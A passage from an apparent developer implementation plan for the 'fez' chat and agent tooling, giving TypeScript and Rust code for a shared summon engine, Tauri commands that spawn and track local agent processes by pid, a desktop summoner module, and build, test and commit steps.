        return;
      }
      if (event.kind === KIND_GIFT_WRAP) {
        if (!dmWatchLive) return;
        const recipient = event.tags.find((t) => t[0] === "p")?.[1];
        if (!recipient) return;
        if (recipient === myPubkey) {
          const dm = client.unwrapDm(event);
          if (dm && dm.senderPk !== myPubkey && dm.ts >= sessionStartS && !seenDmIds.has(dm.id)) {
            seenDmIds.add(dm.id);
            deliver(`✉️ DM from ${engine.nameOf(dm.senderPk)}`, dm.text.slice(0, 90));
          }
          return;
        }
        void engine.handleGiftWrapRecipient(recipient);
        return;
      }
      // Observer frame — failed turns rate a toast. (unchanged)
      try {
        const frame = JSON.parse(client.decryptFrom(event.pubkey, event.content)) as { type?: string; status?: string };
        if (frame.type === "turn" && frame.status === "failed") {
          const agent = event.tags.find((t) => t[0] === "agent")?.[1] ?? engine.nameOf(event.pubkey);
          deliver(`⚠️ @${agent} turn failed`, "Check its herdr tab / ~/.fez/logs for the failure notice.");
        }
      } catch { /* not ours */ }
    }
```

Note the behavior deltas are zero by construction: the engine internally applies the same authority/depth gates the deleted code applied before dispatch; announcement-driven attest/invite and boot hydration live in `seedRosters`/`handleAnnouncement`. The `sessionStartS`/`dmWatchLive`/`seenDmIds` guards stay host-side exactly as before. The roster-count boot log line (362) may be dropped or reproduced from `engine` — dropping it is fine.

- [ ] **Step 3: Build + full test suite**

Run: `cd packages/fez-sentinel && npm run build` — clean.
Run: `cd packages/fez-evals && npx vitest --run` — full suite, expected green (the sentinel has no direct tests beyond `summon-mentions`, which now targets the shared module; the engine tests are the sentinel's behavior tests now).

- [ ] **Step 4: Manual parity smoke (documented, not automated)**

From a terminal: `fez sentinel` against a dev relay; in the TUI or desktop, mention a persona; verify: spawn log line, 47006 + 47102 published, agent announces and answers. This is the same smoke any sentinel change gets.

- [ ] **Step 5: Commit**

```bash
git add packages/fez-sentinel/src/index.ts
git commit -m "sentinel: adopt shared SummonEngine — policy moves to @fezchat/protocol, behavior unchanged"
```

---

### Task 5: Rust spawn commands + pid registry

**Files:**
- Modify: `packages/fez-desktop/src-tauri/src/lib.rs` (new commands + registry helpers; register in `generate_handler!` at line 1873)

**Interfaces:**
- Consumes: nothing TS-side; follows `ensure_local_relay`'s spawn pattern (`lib.rs:1640-1690`) and `valid_persona_name` (`lib.rs:271`).
- Produces (Task 6 invokes these):
  - `spawn_agent(persona: String, channels: Vec<String>, owner: String, relays: String, repo: Option<String>, base_branch: Option<String>) -> Result<u32, String>` — validates, spawns `~/.fez/bin/fez-agent` detached, records `{persona, channels, repo, line, pid}` in `~/.fez/desktop-agents.json`, returns the pid.
  - `kill_agent(persona: String) -> Result<bool, String>` — SIGTERMs the recorded pid if alive; removes the registry row.
  - `agent_alive(persona: String) -> bool` — recorded pid alive (via `/bin/kill -0`, same mechanism as `pid_alive`).
  - `spawned_agents() -> Vec<SpawnedAgent>` where `SpawnedAgent { persona: String, channels: Vec<String>, repo: Option<String>, line: Option<String>, pid: u32 }`.
- Known issue this sidesteps (do NOT try to fix the sentinel here): the sentinel's `agentProcessAlive` pgreps for `"(fez|cli.js) agent <persona>"`, which cannot match the argv-less bundled `fez-agent` — the desktop registry uses exact pids instead.

- [ ] **Step 1: Implement the registry + commands**

Add near the other agent-runner code (after `ensure_agent_runner`, ~line 1751):

```rust
#[derive(serde::Serialize, serde::Deserialize, Clone)]
struct SpawnedAgent {
    persona: String,
    channels: Vec<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    repo: Option<String>,
    #[serde(skip_serializing_if = "Option::is_none")]
    line: Option<String>,
    pid: u32,
}

fn agents_registry_path() -> std::path::PathBuf {
    let home = std::env::var("HOME").unwrap_or_default();
    std::path::PathBuf::from(home).join(".fez").join("desktop-agents.json")
}

fn load_agents_registry() -> Vec<SpawnedAgent> {
    std::fs::read_to_string(agents_registry_path())
        .ok()
        .and_then(|s| serde_json::from_str(&s).ok())
        .unwrap_or_default()
}

fn save_agents_registry(rows: &[SpawnedAgent]) {
    if let Some(dir) = agents_registry_path().parent() {
        let _ = std::fs::create_dir_all(dir);
    }
    let _ = std::fs::write(
        agents_registry_path(),
        serde_json::to_string_pretty(rows).unwrap_or_else(|_| "[]".into()),
    );
}

fn raw_pid_alive(pid: u32) -> bool {
    std::process::Command::new("/bin/kill")
        .args(["-0", &pid.to_string()])
        .status()
        .map(|s| s.success())
        .unwrap_or(false)
}

/// Same safety contract as the shared TS isSafeWork: word char first,
/// then word chars / dot / slash / dash, bounded, no `..`.
fn safe_work(value: &str) -> bool {
    if value.is_empty() || value.len() > 201 || value.contains("..") {
        return false;
    }
    let mut chars = value.chars();
    let first = chars.next().unwrap();
    if !(first.is_ascii_alphanumeric() || first == '_') {
        return false;
    }
    value
        .chars()
        .all(|c| c.is_ascii_alphanumeric() || matches!(c, '_' | '.' | '/' | '-'))
}

/// Spawn the bundled agent runtime for a persona, detached, and record
/// its pid. The desktop's half of the summoner — policy lives in the
/// shared SummonEngine on the JS side; this is only mechanics.
#[tauri::command]
fn spawn_agent(
    persona: String,
    channels: Vec<String>,
    owner: String,
    relays: String,
    repo: Option<String>,
    base_branch: Option<String>,
) -> Result<u32, String> {
    if !valid_persona_name(&persona) {
        return Err(format!("invalid persona name: {persona}"));
    }
    if let Some(r) = &repo {
        if !safe_work(r) {
            return Err(format!("unsafe repo name refused: {r}"));
        }
    }
    if let Some(b) = &base_branch {
        if !safe_work(b) {
            return Err(format!("unsafe branch name refused: {b}"));
        }
    }
    let home = std::env::var("HOME").unwrap_or_default();
    let bin = std::path::PathBuf::from(&home).join(".fez").join("bin").join("fez-agent");
    if !bin.exists() {
        return Err("fez-agent isn't bundled in this build".to_string());
    }
    let log_dir = std::path::PathBuf::from(&home).join(".fez").join("logs");
    std::fs::create_dir_all(&log_dir).map_err(|e| format!("logs dir: {e}"))?;
    let log = std::fs::OpenOptions::new()
        .create(true)
        .append(true)
        .open(log_dir.join(format!("{persona}.log")))
        .map_err(|e| format!("agent log: {e}"))?;
    let log_err = log.try_clone().map_err(|e| format!("agent log: {e}"))?;
    let mut cmd = Command::new(&bin);
    cmd.env("FEZ_AGENT_PERSONA", &persona)
        .env("FEZ_AGENT_CHANNELS", channels.join(","))
        .env("FEZ_AGENT_OWNER", &owner)
        .env("FEZ_RELAY", &relays)
        .stdout(log)
        .stderr(log_err);
    if let Some(r) = &repo {
        cmd.env("FEZ_AGENT_REPO", r);
        if let Some(b) = &base_branch {
            cmd.env("FEZ_AGENT_BASE_BRANCH", b);
        }
    }
    let child = cmd.spawn().map_err(|e| format!("spawn fez-agent: {e}"))?;
    let pid = child.id();
    let mut rows: Vec<SpawnedAgent> =
        load_agents_registry().into_iter().filter(|r| r.persona != persona).collect();
    rows.push(SpawnedAgent { persona, channels, repo, line: base_branch, pid });
    save_agents_registry(&rows);
    Ok(pid)
}

#[tauri::command]
fn kill_agent(persona: String) -> Result<bool, String> {
    let rows = load_agents_registry();
    let hit = rows.iter().find(|r| r.persona == persona).cloned();
    let killed = match &hit {
        Some(row) if raw_pid_alive(row.pid) => std::process::Command::new("/bin/kill")
            .arg(row.pid.to_string())
            .status()
            .map(|s| s.success())
            .unwrap_or(false),
        _ => false,
    };
    if hit.is_some() {
        let rest: Vec<SpawnedAgent> = rows.into_iter().filter(|r| r.persona != persona).collect();
        save_agents_registry(&rest);
    }
    Ok(killed)
}

#[tauri::command]
fn agent_alive(persona: String) -> bool {
    load_agents_registry()
        .iter()
        .any(|r| r.persona == persona && raw_pid_alive(r.pid))
}

#[tauri::command]
fn spawned_agents() -> Vec<SpawnedAgent> {
    load_agents_registry()
}
```

Note on detachment: `Command::spawn` without wait is sufficient — the child outlives the app on macOS (no process-group kill exists in this codebase's shutdown path, matching the spec's detached requirement). Do not add `pre_exec`/setsid; the relay/sentinel spawns use the same shape.

- [ ] **Step 2: Register the commands**

Append `spawn_agent, kill_agent, agent_alive, spawned_agents` to the `generate_handler![...]` list (line 1873).

- [ ] **Step 3: Compile**

Run: `cd packages/fez-desktop/src-tauri && cargo check` — expected clean. (If `serde` derive imports are missing at the top of lib.rs, use the crate's existing pattern — grep `serde_json::json!` usage; `serde::Serialize` is already a dependency.)

- [ ] **Step 4: Commit**

```bash
git add packages/fez-desktop/src-tauri/src/lib.rs
git commit -m "desktop: spawn_agent/kill_agent/agent_alive commands with pid registry"
```

---

### Task 6: Desktop summon host + wiring

**Files:**
- Create: `packages/fez-desktop/src/summoner.ts`
- Modify: `packages/fez-desktop/src/App.tsx` (wire it after client construction, near the `client.on(...)` block ~line 446)

**Interfaces:**
- Consumes: `SummonEngine`/`SummonHost` from the shared module; Tauri commands from Task 5; the app's `Wire` instance (`wire.subscribe`/`wire.query`/`wire.publish` — `packages/fez-client/src/index.ts:82-83`); `invoke` from `@tauri-apps/api/core`; the app's `toast` helper.
- Produces: `startSummoner(opts: { wire: Wire; ownerPubkey: string; relays: string[]; toast: (msg: string) => void }): () => void` — returns an unsubscribe/stop function.

- [ ] **Step 1: Implement `packages/fez-desktop/src/summoner.ts`**

The shared-module import follows the `wire.ts:5` precedent (relative into root `src/` — the appendix cleanup will revisit the pattern for both at once):

```ts
import { invoke } from "@tauri-apps/api/core";
import { SummonEngine, type SummonHost, type SummonEvent } from "../../../src/agent/summon.js";
import type { Wire } from "../../fez-client/src/index.js";

/**
 * The desktop's half of workstream 1 (de-sentinel spec): summon agents
 * from the app's own live subscription while it is open. Policy lives
 * in the shared SummonEngine; this file is the host — Tauri spawn
 * mechanics, wire queries, and the one-summoner-per-machine gate.
 *
 * Gate: if a sentinel is alive (~/.fez/sentinel.pid), the desktop
 * defers ENTIRELY — the sentinel is the machine's summoner. Checked
 * per event with a 10s cache (the sentinel may start/stop while the
 * app is open).
 */

const KIND_MESSAGE = 47103;
const KIND_DOC_COMMENT = 40101;
const KIND_METADATA = 47000;
const KIND_GIFT_WRAP = 1059;

export function startSummoner(opts: {
  wire: Wire;
  ownerPubkey: string;
  relays: string[];
  toast: (msg: string) => void;
}): () => void {
  const { wire, ownerPubkey, relays, toast } = opts;

  let sentinelCheck: { verdict: boolean; at: number } = { verdict: false, at: 0 };
  async function sentinelAlive(): Promise<boolean> {
    if (Date.now() - sentinelCheck.at < 10_000) return sentinelCheck.verdict;
    const verdict = await invoke<boolean>("runner_status").catch(() => false);
    sentinelCheck = { verdict, at: Date.now() };
    return verdict;
  }

  const host: SummonHost = {
    ownerPubkey,
    personaExists: async (name) => {
      // Mirror the sentinel's rule (fez-sentinel/src/index.ts:160-168):
      // the persona file must exist AND its harness must not be "router".
      if (!(await invoke<string[]>("list_personas").catch(() => [])).includes(name)) return false;
      const raw = await invoke<string>("read_persona", { name }).catch(() => "");
      const harness = raw.match(/^harness:\s*(.+)$/m)?.[1]?.trim();
      return harness !== undefined && harness !== "router";
    },
    personaPubkey: async (name) => {
      // Agent keys are minted CLI/sentinel-side; the desktop can't read
      // the keychain for them, so pre-invite resolves via the announced
      // roster instead. An unannounced brand-new persona summons fine —
      // its announce-time invite (engine.handleAnnouncement) covers it.
      const events = await wire.query([{ kinds: [KIND_METADATA], limit: 200 }]);
      for (const ev of events) {
        try {
          if (JSON.parse(ev.content).name?.toLowerCase() === name) return ev.pubkey;
        } catch { /* ignore */ }
      }
      return undefined;
    },
    agentAlive: (name) => invoke<boolean>("agent_alive", { persona: name }).catch(() => false),
    registryEntry: async (name) => {
      const rows = await invoke<{ persona: string; channels: string[]; repo?: string; line?: string }[]>("spawned_agents").catch(() => []);
      const row = rows.find((r) => r.persona === name);
      return row ? { channels: row.channels, work: row.repo ? { repo: row.repo, line: row.line } : undefined } : undefined;
    },
    spawn: async (persona, channels, work) => {
      await invoke("spawn_agent", {
        persona,
        channels,
        owner: ownerPubkey,
        relays: relays.join(","),
        repo: work?.repo ?? null,
        baseBranch: work?.line ?? null,
      });
    },
    restart: async (persona, channels, work) => {
      await invoke("kill_agent", { persona }).catch(() => {});
      await invoke("spawn_agent", {
        persona,
        channels,
        owner: ownerPubkey,
        relays: relays.join(","),
        repo: work?.repo ?? null,
        baseBranch: work?.line ?? null,
      });
    },
    query: (filters) => wire.query(filters as never) as Promise<SummonEvent[]>,
    publish: async (template) => {
      await wire.publish(template as never);
    },
    announceTimeout: (persona) => {
      toast(`@${persona} failed to start — its process died before announcing (see ~/.fez/logs/${persona}.log)`);
    },
  };

  const engine = new SummonEngine(host);
  void engine.seedRosters();

  const sessionStartS = Math.floor(Date.now() / 1000);
  let dmWatchLive = false;
  const dmTimer = setTimeout(() => { dmWatchLive = true; }, 5000);

  const unsub = wire.subscribe(
    [
      { kinds: [KIND_MESSAGE], since: sessionStartS },
      { kinds: [KIND_DOC_COMMENT], since: sessionStartS },
      { kinds: [KIND_METADATA], since: sessionStartS },
      // NIP-59 wraps carry FUZZED timestamps — subscribing from "now"
      // misses live wraps back-dated by the fuzz. Same widening the
      // sentinel applies. Import at top of this file, leaf module only
      // (wire.ts's pattern — never the root src/index.js in the webview):
      //   import { DM_FUZZ_WINDOW_S } from "../../../src/protocol/dm.js";
      { kinds: [KIND_GIFT_WRAP], since: sessionStartS - DM_FUZZ_WINDOW_S },
    ],
    (event) => {
      void (async () => {
        if (await sentinelAlive()) return; // the sentinel is the summoner
        if (event.kind === KIND_GIFT_WRAP) {
          if (!dmWatchLive) return;
          const recipient = event.tags.find((t: string[]) => t[0] === "p")?.[1];
          if (recipient && recipient !== ownerPubkey) await engine.handleGiftWrapRecipient(recipient);
          return;
        }
        await engine.handleEvent(event as SummonEvent);
      })();
    }
  );

  return () => {
    clearTimeout(dmTimer);
    unsub();
  };
}
```

- [ ] **Step 2: Wire into `App.tsx`**

Where the app has its constructed `wire`, owner pubkey, relay list, and `toast` in scope (the effect that installs `client.on(...)` handlers, ~line 446, or the boot effect near `App.tsx:120-153` — implementer picks the one where all four values already exist), add:

```ts
    const stopSummoner = startSummoner({
      wire,
      ownerPubkey: myPubkey,
      relays: relayUrls,
      toast: (m) => toast.info(m, 0),
    });
```

with `stopSummoner()` in that effect's cleanup, and the import at top: `import { startSummoner } from "./summoner";`. Match the surrounding effect's exact variable names for wire/pubkey/relays — they exist under local names in `App.tsx`; do not thread new props.

- [ ] **Step 3: Typecheck + build**

Run: `cd packages/fez-desktop && npx tsc --noEmit` (or the package's check script) — clean.
Run: `cd packages/fez-desktop && npm run build` if a JS build script exists (Tauri bundle NOT required for this task).

- [ ] **Step 4: Manual e2e (the workstream's acceptance test)**

Documented for whoever runs it (needs the built app):
1. Quit any sentinel (`launchctl bootout` if installed; check `runner_status` → false).
2. Launch the desktop app, mention `@fez` (or any persona) in a channel.
3. Expect: agent spawns (pid in `~/.fez/desktop-agents.json`), announces, answers; 47006 + 47102 visible on the relay.
4. Start `fez sentinel` in a terminal; mention again → desktop defers (sentinel log shows the summon, no duplicate process).
5. Kill the app mid-agent-turn → agent process survives (detached).

- [ ] **Step 5: Commit**

```bash
git add packages/fez-desktop/src/summoner.ts packages/fez-desktop/src/App.tsx
git commit -m "desktop: in-app summoner — engine host over spawn_agent, deferring to a live sentinel"
```
